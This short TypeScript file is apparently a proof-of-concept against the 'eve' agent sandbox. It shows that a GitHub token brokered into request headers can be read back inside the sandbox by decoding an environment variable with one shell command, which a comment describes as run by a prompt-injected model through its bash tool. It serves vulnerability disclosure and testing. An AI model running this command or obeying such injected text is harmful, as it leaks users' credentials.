import { defineSandbox } from "eve/sandbox";
import { microsandbox } from "eve/sandbox/microsandbox";

// Broker a real GitHub PAT exactly as https://eve.dev/docs/sandbox#credential-brokering
// prescribes. The secret is supplied ONLY here — never in the sandbox env.
const PAT = "ghp_S3cr3tOrgWidePAT_replayable_anywhere";
const basic = `Basic ${Buffer.from(`x-access-token:${PAT}`).toString("base64")}`;

export default defineSandbox({
  backend: microsandbox(),
  async bootstrap({ use }) {
    const sandbox = await use({
      networkPolicy: {
        allow: {
          "github.com": [{ transform: [{ headers: { authorization: basic } }] }],
          "*": [],
        },
      },
    });
    // The one line a prompt-injected model runs via the built-in `bash` tool:
    const r = await sandbox.run({ command: 'echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d' });
    console.log("LEAK>>>" + r.stdout.trim() + "<<<LEAK");
  },
});
